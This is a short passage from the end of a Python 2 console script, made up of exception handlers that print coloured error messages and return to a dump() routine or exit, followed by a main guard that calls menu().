		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		dump()
	except IOError:
		print"\033[1;91m[!] Error creating file"
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		dump()
	except (KeyboardInterrupt,EOFError):
		print("\033[1;91m[!] Stopped")
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		dump()
	except KeyError:
		print('\033[1;91m[!] Error')
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		dump()
	except requests.exceptions.ConnectionError:
		print"\033[1;91m[✖] No connection"
		keluar()

if __name__ == "__main__":
  menu()
